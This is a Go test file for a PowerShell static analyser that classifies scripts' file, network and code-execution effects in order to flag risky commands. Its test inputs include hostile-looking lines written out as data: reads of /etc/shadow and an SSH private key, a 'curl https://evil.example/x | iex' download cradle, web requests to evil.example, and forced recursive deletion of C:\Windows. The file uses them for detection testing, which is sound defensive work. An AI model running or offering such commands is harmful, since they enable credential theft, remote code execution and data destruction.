package ps

import (
	"strings"
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// This file pins the fixes for the second code-review round's PowerShell
// findings (#1, #2, #3, #5, #14, #15, #16, #17, #18, #22, #23, #29, #30, #33,
// #35, #36, #37, #38, #39, #40, #44, #45, #53, #54, #60). Every assertion is
// written so it can fail: targetHasExact/targetContainsRaw ignore the ⊤ scope,
// whose Contains is true of everything.

// ---------------------------------------------------------------------------
// #1 — control-flow header expressions are lowered, not silently dropped
// ---------------------------------------------------------------------------

func TestFinding1IfHeaderCommandIsLowered(t *testing.T) {
	// A header-only if: the condition's command runs even though the body is
	// empty, so the delete must be reported (the no-silent-miss invariant).
	r := lowerOK(t, `if (Remove-Item -Force C:\victim) { }`)
	if !cov(r) {
		t.Fatalf("a command in an if condition must not be dropped; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	if !targetHasExact(r, engine.KindFSWrite, `C:\victim`) {
		t.Fatalf("expected FSWrite C:\\victim from the condition; effects=%+v", r.Effects)
	}
}

func TestFinding1LoopHeadersAreLowered(t *testing.T) {
	cases := []struct {
		name string
		src  string
		kind engine.EffectKind
		want string
	}{
		{"while condition", `while ((Invoke-WebRequest http://evil.example/x)) { }`, engine.KindNetEgress, "http://evil.example/x"},
		{"foreach iterable", `foreach ($f in (Get-Content /etc/shadow)) { }`, engine.KindFSRead, "/etc/shadow"},
		{"for initializer", `for ($i=(iwr http://evil/x); $false; ) { }`, engine.KindNetEgress, "http://evil/x"},
		{"do condition", `do { } while ((iwr http://evil/do))`, engine.KindNetEgress, "http://evil/do"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := lowerOK(t, tc.src)
			if !cov(r) {
				t.Fatalf("a header-only loop must not lower to nothing; notes=%v", r.Notes)
			}
			if !targetHasExact(r, tc.kind, tc.want) {
				t.Fatalf("expected %s %s from the header; effects=%+v notes=%v", tc.kind, tc.want, r.Effects, r.Notes)
			}
			if r.Conservative {
				t.Errorf("a resolvable header must not degrade the program to ⊤: %v", r.Notes)
			}
		})
	}
}

func TestFinding1HeaderAndBodyBothLowered(t *testing.T) {
	r := lowerOK(t, `if (Get-Content a.txt) { Remove-Item b.txt }`)
	if !targetHasExact(r, engine.KindFSRead, "a.txt") {
		t.Fatalf("the condition's read is missing; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	if !targetHasExact(r, engine.KindFSWrite, "b.txt") {
		t.Fatalf("the arm's write is missing; effects=%+v", r.Effects)
	}
}

func TestFinding1HeaderChannelReadsAndEgress(t *testing.T) {
	// An $env: read in a condition is a read too.
	if r := lowerOK(t, `if ($env:LIST) { }`); !targetHasExact(r, engine.KindEnvRead, "LIST") {
		t.Errorf("an $env: read in a condition must be reported; effects=%+v", r.Effects)
	}
	// The condition of an elseif is evaluated when the first arm is false.
	r := lowerOK(t, `if ($false) { } elseif ((iwr http://evil/else)) { }`)
	if !targetHasExact(r, engine.KindNetEgress, "http://evil/else") {
		t.Fatalf("an elseif condition must be lowered; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	// The condition of an arm that cannot run is dead code, not a miss.
	r2 := lowerOK(t, `if ($true) { } elseif ((iwr http://evil/dead)) { }`)
	if targetHasExact(r2, engine.KindNetEgress, "http://evil/dead") {
		t.Errorf("the condition of an unreachable arm must not be lowered; effects=%+v", r2.Effects)
	}
}

// ---------------------------------------------------------------------------
// #2 — a non-constant condition is not "certainly true"
// ---------------------------------------------------------------------------

func TestFinding2UnknownConditionKeepsSiblingArms(t *testing.T) {
	cases := []struct {
		src   string
		kinds []string
	}{
		// A cmdlet call in the condition is not a decidable literal.
		{"if (Get-Item C:\\x) { Remove-Item a.txt } else { Remove-Item b.txt }", []string{"a.txt", "b.txt"}},
		// Nor is an operator expression over a variable.
		{"$i = 'b'; if ($i -eq 'a') { Remove-Item then.txt } else { Remove-Item else.txt }", []string{"then.txt", "else.txt"}},
	}
	for _, tc := range cases {
		t.Run(tc.src, func(t *testing.T) {
			r := lowerOK(t, tc.src)
			for _, want := range tc.kinds {
				if !targetHasExact(r, engine.KindFSWrite, want) {
					t.Errorf("arm %s must run (the condition is unresolved); effects=%+v notes=%v", want, r.Effects, r.Notes)
				}
			}
		})
	}
}

func TestFinding2UnknownConditionDoesNotFabricateBranchValue(t *testing.T) {
	r := lowerOK(t, "if (Test-Path C:\\x) { $v = 'a' } else { $v = 'b' }\nRemove-Item $v")
	// The two arms disagree, so the target must be ⊤ — not the value of a
	// branch that may not have run.
	if !hasTopTarget(t, r, engine.KindFSWrite) {
		t.Fatalf("a value bound by either of two arms must not resolve concretely; effects=%+v", r.Effects)
	}
	for _, e := range effectsOfKind(r, engine.KindFSWrite) {
		for _, tgt := range e.Target.Targets() {
			if tgt == "a" || tgt == "b" {
				t.Fatalf("fabricated concrete target %q from an undecided branch: %+v", tgt, r.Effects)
			}
		}
	}
}

// ---------------------------------------------------------------------------
// #3 — a non-empty string is truthy, whatever it spells
// ---------------------------------------------------------------------------

func TestFinding3StringConstantsAreTruthy(t *testing.T) {
	cases := []struct {
		src  string
		want string
	}{
		{`if ("0") { Remove-Item C:\Windows }`, `C:\Windows`},
		{"$s = 'False'\nif ($s) { Remove-Item -Recurse -Force x.txt }", "x.txt"},
		{"$x = '0'\nif ($x) { Remove-Item C:\\Windows }", `C:\Windows`},
	}
	for _, tc := range cases {
		r := lowerOK(t, tc.src)
		if !targetHasExact(r, engine.KindFSWrite, tc.want) {
			t.Errorf("%q: the branch PowerShell executes is missing (%s); effects=%+v notes=%v",
				tc.src, tc.want, r.Effects, r.Notes)
		}
	}
}

func TestFinding3EmptyStringAndZeroStayFalse(t *testing.T) {
	// The typed constants keep their PowerShell truthiness: the body of a
	// known-false arm does not run.
	for _, src := range []string{
		`if ("") { Remove-Item z.txt }`,
		`if (0) { Remove-Item z.txt }`,
		`if ($false) { Remove-Item z.txt }`,
		`if ($null) { Remove-Item z.txt }`,
	} {
		if r := lowerOK(t, src); hasKind(r, engine.KindFSWrite) {
			t.Errorf("%q: a known-false condition must skip its body; effects=%+v", src, r.Effects)
		}
	}
}

// ---------------------------------------------------------------------------
// #5 — a word that merely starts with a quote is not a quoted literal
// ---------------------------------------------------------------------------

func TestFinding5QuotePrefixedConcatenationIsNotALiteral(t *testing.T) {
	// The value of `'x' + $y` is not the text between the first pair of
	// quotes, so a word that starts with one and continues past it is unknown.
	for _, text := range []string{`'x' + $y`, `'a.txt','b.txt'`, `"a" + "b"`, `'a' 'b'`} {
		if got := evalOf(t, text, map[string]string{"y": "z"}); got.Known {
			t.Errorf("eval(%q) = %q (known), want unknown: the word is a concatenation, not one literal",
				text, got.Text)
		}
	}
	// A genuinely whole-word quoted literal still resolves.
	for _, tc := range []struct{ text, want string }{
		{`'a.txt'`, "a.txt"},
		{`"a.txt"`, "a.txt"},
		{`'it''s'`, "it's"},
		{`"pre$(cmd)post"`, ""}, // interpolated sub-expression: known=false
	} {
		got := evalOf(t, tc.text, nil)
		if tc.want == "" {
			if got.Known {
				t.Errorf("eval(%q) must stay unknown", tc.text)
			}
			continue
		}
		if !got.Known || got.Text != tc.want {
			t.Errorf("eval(%q) = (%q, known=%v), want (%q, true)", tc.text, got.Text, got.Known, tc.want)
		}
	}
}

func TestFinding5ConcatenationBindsNoFabricatedTarget(t *testing.T) {
	r := lowerOK(t, "$a = 'x' + $y\nRemove-Item $a")
	if !hasTopTarget(t, r, engine.KindFSWrite) {
		t.Fatalf("a concatenation right-hand side must degrade to ⊤; effects=%+v", r.Effects)
	}
	if targetContainsRaw(r, engine.KindFSWrite, "$y") {
		t.Fatalf("the raw concatenation text leaked as a target: %+v", r.Effects)
	}
}

func TestFinding5ConcatenatedEgressIsNotDropped(t *testing.T) {
	// The fabricated literal used to fail the host grammar, so the egress was
	// silently dropped; it must be reported (⊤ is the sound stand-in).
	r := lowerOK(t, "$hostname = 'h'\n$u = 'https://evil.example/' + $hostname\nInvoke-WebRequest $u")
	if !hasKind(r, engine.KindNetEgress) {
		t.Fatalf("a concatenated URL still reaches the network: the egress must be reported; effects=%+v notes=%v",
			r.Effects, r.Notes)
	}
}

// ---------------------------------------------------------------------------
// #14 / #44 — splatting
// ---------------------------------------------------------------------------

func TestFinding14SplatOperandLeavesNoRawTarget(t *testing.T) {
	r := lowerOK(t, "$p = @{Path='/etc/x.txt'}\nGet-Content @p")
	if !targetHasExact(r, engine.KindFSRead, "/etc/x.txt") {
		t.Fatalf("the splat must expand to its binding; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	if targetContainsRaw(r, engine.KindFSRead, "@p") {
		t.Fatalf("the raw splat text leaked as a target: %+v", r.Effects)
	}
	if r.Conservative {
		t.Fatalf("a fully-known splat must not flip the program to ⊤; notes=%v", r.Notes)
	}
}

func TestFinding44NamedParameterSplatExpands(t *testing.T) {
	r := lowerOK(t, "$p = @{Path='secrets.txt'}\nRemove-Item -Path @p -Recurse -Force")
	if !targetHasExact(r, engine.KindFSWrite, "secrets.txt") {
		t.Fatalf("a splat used as a parameter value must expand; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	if targetContainsRaw(r, engine.KindFSWrite, "@p") {
		t.Fatalf("the raw splat text leaked as a target: %+v", r.Effects)
	}
	if r.Destructiveness != engine.DestructCritical {
		t.Fatalf("the splatted -Recurse must still escalate destructiveness; got %s", r.Destructiveness)
	}
}

// ---------------------------------------------------------------------------
// #15 / #45 — member and index assignment targets
// ---------------------------------------------------------------------------

func TestFinding15MemberAssignmentInvalidatesBase(t *testing.T) {
	r := lowerOK(t, "$o = 'keep'\n$o.Prop = '/etc/passwd'\nGet-Content $o")
	if !hasTopTarget(t, r, engine.KindFSRead) {
		t.Fatalf("a write through a member must invalidate the base variable; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	if targetContainsRaw(r, engine.KindFSRead, "/etc/passwd") {
		t.Fatalf("the member's value was fabricated onto the base variable: %+v", r.Effects)
	}
}

func TestFinding15MemberAssignmentDoesNotMaskRealPath(t *testing.T) {
	r := lowerOK(t, "$f = '/etc/shadow'\n$f.Length = 0\nGet-Content $f")
	// The read must not resolve to the member's value (the old behaviour
	// replaced the real, secret-bearing path with "0").
	if targetContainsRaw(r, engine.KindFSRead, "0") {
		t.Fatalf("the member's value replaced the base variable's real path: %+v", r.Effects)
	}
	if !hasTopTarget(t, r, engine.KindFSRead) {
		t.Fatalf("the base variable must be ⊤ after a member write; effects=%+v", r.Effects)
	}
}

func TestFinding45SubscriptVariableIsNotATarget(t *testing.T) {
	const src = "$a[$i] = 'x','y'\nGet-Content $i"
	a := firstAssign(t, src)
	if len(a.Targets) != 0 {
		t.Fatalf("an index LHS binds no plain target, got %+v", a.Targets)
	}
	if len(a.Invalidate) != 1 || a.Invalidate[0].Text != "$a" {
		t.Fatalf("Invalidate = %+v, want the base variable $a", a.Invalidate)
	}
	r := lowerOK(t, src)
	if targetContainsRaw(r, engine.KindFSRead, "y") {
		t.Fatalf("the subscript variable must not be bound to an array element: %+v", r.Effects)
	}
	if !hasTopTarget(t, r, engine.KindFSRead) {
		t.Fatalf("the subscript variable is unknown: effects=%+v", r.Effects)
	}
}

// ---------------------------------------------------------------------------
// #16 / #40 — session-state mutation spellings
// ---------------------------------------------------------------------------

func TestFinding16ClearVariablePositionalUnsets(t *testing.T) {
	r := lowerOK(t, "$x = 'known.txt'\nClear-Variable x\nGet-Content $x")
	if targetContainsRaw(r, engine.KindFSRead, "known.txt") {
		t.Fatalf("a positional Clear-Variable must unset the variable: %+v", r.Effects)
	}
	if !hasTopTarget(t, r, engine.KindFSRead) {
		t.Fatalf("a cleared variable must read as unknown; effects=%+v", r.Effects)
	}
}

func TestFinding16RemoveItemVariablePathUnsets(t *testing.T) {
	r := lowerOK(t, "$x = 'known.txt'\nRemove-Item Variable:\\x\nGet-Content $x")
	if targetContainsRaw(r, engine.KindFSRead, "known.txt") {
		t.Fatalf("a Variable:\\ path must unset the variable it names: %+v", r.Effects)
	}
	if !hasTopTarget(t, r, engine.KindFSRead) {
		t.Fatalf("the unset variable must read as unknown; effects=%+v", r.Effects)
	}
}

func TestFinding16SetVariablePositionalBinds(t *testing.T) {
	r := lowerOK(t, "Set-Variable x 'known.txt'\nGet-Content $x")
	if !targetHasExact(r, engine.KindFSRead, "known.txt") {
		t.Fatalf("the positional Set-Variable form must bind the value; effects=%+v notes=%v", r.Effects, r.Notes)
	}
}

func TestFinding16QuotedNameIsUnquoted(t *testing.T) {
	r := lowerOK(t, "Set-Variable -Name 'h' -Value 'evil.example'\nInvoke-WebRequest \"http://$h/x\"")
	if !targetHasExact(r, engine.KindNetEgress, "http://evil.example/x") {
		t.Fatalf("a quoted -Name value must bind the variable; effects=%+v notes=%v", r.Effects, r.Notes)
	}
}

func TestFinding40RemoveVariableUnsets(t *testing.T) {
	for _, src := range []string{
		"$x = '/etc/passwd'\nRemove-Variable x\nGet-Content $x",
		"$x = '/etc/passwd'\nrv x\nGet-Content $x",
	} {
		r := lowerOK(t, src)
		if targetContainsRaw(r, engine.KindFSRead, "/etc/passwd") {
			t.Errorf("%q: the removed variable kept a stale concrete target: %+v", src, r.Effects)
		}
		if !hasTopTarget(t, r, engine.KindFSRead) {
			t.Errorf("%q: a removed variable must read as unknown; effects=%+v", src, r.Effects)
		}
	}
}

// ---------------------------------------------------------------------------
// #17 — a foreach over a literal range iterates its elements
// ---------------------------------------------------------------------------

func TestFinding17ForeachRangeIteratesExactly(t *testing.T) {
	for _, src := range []string{
		`foreach ($i in 1..3) { Get-Content "f$i" }`,
		"$n = 3\n" + `foreach ($i in 1..$n) { Get-Content "f$i" }`,
	} {
		r := lowerOK(t, src)
		for _, want := range []string{"f1", "f2", "f3"} {
			if !targetHasExact(r, engine.KindFSRead, want) {
				t.Errorf("%q: expected FSRead %s; effects=%+v notes=%v", src, want, r.Effects, r.Notes)
			}
		}
		if hasTopTarget(t, r, engine.KindFSRead) {
			t.Errorf("%q: an exact range must not leave an unresolved read; effects=%+v", src, r.Effects)
		}
	}
}

func TestFinding17WideOrDynamicRangeIsUnknown(t *testing.T) {
	// A range too wide to expand (or with a dynamic bound) makes the loop
	// variable unknown — never the range's source text.
	r := lowerOK(t, `foreach ($i in 1..100000) { Get-Content "f$i" }`)
	if !hasTopTarget(t, r, engine.KindFSRead) {
		t.Fatalf("an unexpanded range must leave the loop variable unknown; effects=%+v", r.Effects)
	}
	if r.Conservative {
		t.Fatalf("an unexpanded range is not a ⊤ CodeExec conclusion; notes=%v", r.Notes)
	}
}

// ---------------------------------------------------------------------------
// #18 — class / trap / param are opaque (⊤), not dropped
// ---------------------------------------------------------------------------

func TestFinding18OpaqueDefinitionsAreTopNotDropped(t *testing.T) {
	for _, src := range []string{
		"trap { Remove-Item -Recurse -Force C:\\Windows }",
		"class C { [void] M() { } }",
		`param($a = 'x')`,
	} {
		r := lowerOK(t, src)
		if !r.Conservative || !hasKind(r, engine.KindCodeExec) {
			t.Errorf("%q: an opaque definition must lower to ⊤, not to nothing; effects=%+v notes=%v",
				src, r.Effects, r.Notes)
		}
	}
}

// ---------------------------------------------------------------------------
// #29 — numeric += is an addition
// ---------------------------------------------------------------------------

func TestFinding29NumericPlusAssignAdds(t *testing.T) {
	r := lowerOK(t, "$i = 0\n$i += 1\nCopy-Item x \"out$i.txt\"")
	if !targetHasExact(r, engine.KindFSWrite, "out1.txt") {
		t.Fatalf("a numeric += must add; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	if targetContainsRaw(r, engine.KindFSWrite, "out01.txt") {
		t.Fatalf("+= string-concatenated two numbers: %+v", r.Effects)
	}
}

func TestFinding29StringPlusAssignConcatenates(t *testing.T) {
	r := lowerOK(t, "$s = 'a'\n$s += 'b'\nCopy-Item x \"out$s.txt\"")
	if !targetHasExact(r, engine.KindFSWrite, "outab.txt") {
		t.Fatalf("a string += must concatenate; effects=%+v notes=%v", r.Effects, r.Notes)
	}
}

// ---------------------------------------------------------------------------
// #30 / #38 — an array or operator right-hand side is not one literal
// ---------------------------------------------------------------------------

func TestFinding30CommaRHSIsNotOneLiteral(t *testing.T) {
	for _, tc := range []struct {
		src    string
		forbid string
	}{
		{"$a = 1,2\nRemove-Item $a", "1,2"},
		{"$t = 'a.txt','b.txt'\nRemove-Item $t", "a.txt','b.txt"},
	} {
		r := lowerOK(t, tc.src)
		if targetContainsRaw(r, engine.KindFSWrite, tc.forbid) {
			t.Errorf("%q: the composite array text leaked as a target: %+v", tc.src, r.Effects)
		}
		if !hasTopTarget(t, r, engine.KindFSWrite) {
			t.Errorf("%q: an array right-hand side must bind set-but-unknown; effects=%+v", tc.src, r.Effects)
		}
	}
}

func TestFinding38OperatorRHSIsNotOneLiteral(t *testing.T) {
	for _, tc := range []struct {
		src    string
		kind   engine.EffectKind
		forbid string
	}{
		{"$n = 1 + 2; Get-Content $n", engine.KindFSRead, "1 + 2"},
		{"$f = '/etc' + '/shadow'; Get-Content $f", engine.KindFSRead, "shadow"},
	} {
		r := lowerOK(t, tc.src)
		if targetContainsRaw(r, tc.kind, tc.forbid) {
			t.Errorf("%q: the operator expression leaked as a target: %+v", tc.src, r.Effects)
		}
		if !hasTopTarget(t, r, tc.kind) {
			t.Errorf("%q: an operator right-hand side must bind set-but-unknown; effects=%+v", tc.src, r.Effects)
		}
	}
}

// ---------------------------------------------------------------------------
// #35 — a statement swallowed by a command's parse ERROR must not vanish
// ---------------------------------------------------------------------------

func TestFinding35StatementAbsorbedByCommandErrorIsTop(t *testing.T) {
	cases := []string{
		"Write-Output $env:TMP\\x\nRemove-Item -Recurse -Force C:\\Windows",
		"Set-Content -Path $env:TMP\\x -Value y\nRemove-Item -Recurse -Force C:\\Windows",
	}
	for _, src := range cases {
		p := Parse("t", src)
		if !p.Top || p.Reason == "" {
			t.Errorf("%q: a statement absorbed into a command's ERROR must degrade to ⊤; top=%v reason=%q stmts=%+v",
				src, p.Top, p.Reason, p.Stmts)
			continue
		}
		if r := Lower(p); !cov(r) || !r.Conservative {
			t.Errorf("%q: the ⊤ program must lower conservatively; effects=%+v", src, r.Effects)
		}
	}
	// A one-line operand ERROR stays best-effort: the ⊤ rule must not swallow
	// the recovery the recovery path exists for.
	if p := Parse("t", `Get-Content $env:USERPROFILE\.ssh\id_rsa`); p.Top {
		t.Fatalf("a one-line operand ERROR must stay best-effort: %s", p.Reason)
	}
}

// ---------------------------------------------------------------------------
// #36 — a command iterable is not the loop value
// ---------------------------------------------------------------------------

func TestFinding36CommandIterableBindsNoSourceText(t *testing.T) {
	r := lowerOK(t, "foreach ($x in Get-Content /etc/passwd) { Remove-Item $x }")
	if !targetHasExact(r, engine.KindFSRead, "/etc/passwd") {
		t.Fatalf("the iterable command must be lowered; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	if targetContainsRaw(r, engine.KindFSWrite, "Get-Content") {
		t.Fatalf("the command's source text leaked as the loop value: %+v", r.Effects)
	}
	if !hasTopTarget(t, r, engine.KindFSWrite) {
		t.Fatalf("a command iterable must leave the loop variable unknown; effects=%+v", r.Effects)
	}
}

// ---------------------------------------------------------------------------
// #37 — input redirection is a read
// ---------------------------------------------------------------------------

func TestFinding37InputRedirectionIsARead(t *testing.T) {
	r := lowerOK(t, `Write-Output hi < C:\in.txt`)
	if hasKind(r, engine.KindFSWrite) {
		t.Fatalf("an input redirection must not write a file; effects=%+v notes=%v", r.Effects, r.Notes)
	}
	if !targetHasExact(r, engine.KindFSRead, `C:\in.txt`) {
		t.Fatalf("an input redirection must read its target; effects=%+v notes=%v", r.Effects, r.Notes)
	}

	// The same classification holds where the cmdlet contributes its own ⊤ read
	// (the file read is then merged into that ⊤ scope): no write appears, and
	// no note classifies the operator as a write.
	r2 := lowerOK(t, `Get-Content < C:\in.txt`)
	if hasKind(r2, engine.KindFSWrite) {
		t.Fatalf("an input redirection must not write a file; effects=%+v", r2.Effects)
	}
	for _, n := range r2.Notes {
		if strings.HasPrefix(n, "redirection <") && strings.Contains(n, "FSWrite") {
			t.Fatalf("the input redirection was classified as a write: %q", n)
		}
	}
	// Output redirection still writes.
	r3 := lowerOK(t, `Get-Content a.txt > out.txt`)
	if !targetHasExact(r3, engine.KindFSWrite, "out.txt") {
		t.Fatalf("an output redirection must write its target; effects=%+v", r3.Effects)
	}
}

// ---------------------------------------------------------------------------
// #39 — the $(…) scan consumes its closing parenthesis
// ---------------------------------------------------------------------------

func TestFinding39SubexpressionScanWidth(t *testing.T) {
	got := evalOf(t, `"a$(cmd)b"`, nil)
	if got.Known {
		t.Fatalf("a sub-expression is not statically known: %+v", got)
	}
	if got.Text != "ab" {
		t.Fatalf("the closing ')' leaked into the literal tail: Text = %q, want %q", got.Text, "ab")
	}
	// The same reference followed by more literal text keeps the tail intact.
	if got := evalOf(t, `"a$(cmd)b$(cmd)c"`, nil); got.Text != "abc" {
		t.Fatalf("scanning two sub-expressions: Text = %q, want %q", got.Text, "abc")
	}
}

// ---------------------------------------------------------------------------
// #53 — the pipeline group does not leak into an argument's script block
// ---------------------------------------------------------------------------

func TestFinding53PipelineGroupDoesNotLeakIntoScriptBlocks(t *testing.T) {
	// A sink inside a script-block argument does not consume the pipeline's
	// value, so it must not be tagged as the cradle sink.
	r := lowerOK(t, `Invoke-WebRequest https://x/a | ForEach-Object { Invoke-Expression 'Write-Host unrelated' }`)
	if hasCradle(r) {
		t.Fatalf("a sink inside an argument's script block must not inherit the pipeline group; effects=%+v", r.Effects)
	}
	if !hasKind(r, engine.KindNetEgress) || !hasKind(r, engine.KindCodeExec) {
		t.Fatalf("both stages must still be lowered; effects=%+v", r.Effects)
	}
	// The pipeline's own sink is still established.
	if r2 := lowerOK(t, `curl https://evil.example/x | iex`); !hasCradle(r2) {
		t.Fatalf("the pipeline's own sink must stay the cradle sink; effects=%+v", r2.Effects)
	}
}

// ---------------------------------------------------------------------------
// #54 — a download's -OutFile is the ingest sink
// ---------------------------------------------------------------------------

func TestFinding54DownloadOutFileIsIngestSink(t *testing.T) {
	for _, src := range []string{
		`Invoke-WebRequest https://x -OutFile f.ps1`,
		`curl https://x -OutFile f.ps1`,
	} {
		r := lowerOK(t, src)
		ingest := false
		for _, e := range r.Effects {
			if e.Kind == engine.KindFSWrite && e.NetFlow == engine.FlowIngest {
				ingest = true
			}
		}
		if !ingest {
			t.Errorf("%q: the -OutFile write must be tagged as the fetch's ingest sink; effects=%+v", src, r.Effects)
			continue
		}
		if sc := engine.ScoreEffects(r.Effects); len(sc.IngestFlows) != 1 {
			t.Errorf("%q: score.ingestFlows = %d, want 1", src, len(sc.IngestFlows))
		}
	}
	// A local write that is not a download keeps its plain FSWrite.
	r := lowerOK(t, `Out-File -FilePath out.txt`)
	for _, e := range effectsOfKind(r, engine.KindFSWrite) {
		if e.NetFlow != engine.FlowNone {
			t.Errorf("a plain write must not be tagged as an ingest sink: %+v", e)
		}
	}
}

// ---------------------------------------------------------------------------
// regression guard: the fixed paths must not degrade the good ones
// ---------------------------------------------------------------------------

func TestFindingFixesKeepKnownValuesConcrete(t *testing.T) {
	cases := []struct {
		src  string
		kind engine.EffectKind
		want string
	}{
		{"$dir = '/tmp/target'\nRemove-Item $dir/file.txt", engine.KindFSWrite, "/tmp/target/file.txt"},
		{"$a, $b = 'p1', 'p2'\nGet-Content $a\nRemove-Item $b", engine.KindFSRead, "p1"},
		{"$y = 'a b'\nRemove-Item $y", engine.KindFSWrite, "a b"},
		{"foreach ($i in 'a.txt', 'b.txt') { Get-Content $i }", engine.KindFSRead, "b.txt"},
		{"$p = @{Path = 'd.txt'; Recurse = $true}\nRemove-Item @p", engine.KindFSWrite, "d.txt"},
	}
	for _, tc := range cases {
		r := lowerOK(t, tc.src)
		if !targetHasExact(r, tc.kind, tc.want) {
			t.Errorf("%q: expected %s %s; effects=%+v notes=%v", tc.src, tc.kind, tc.want, r.Effects, r.Notes)
		}
	}
}
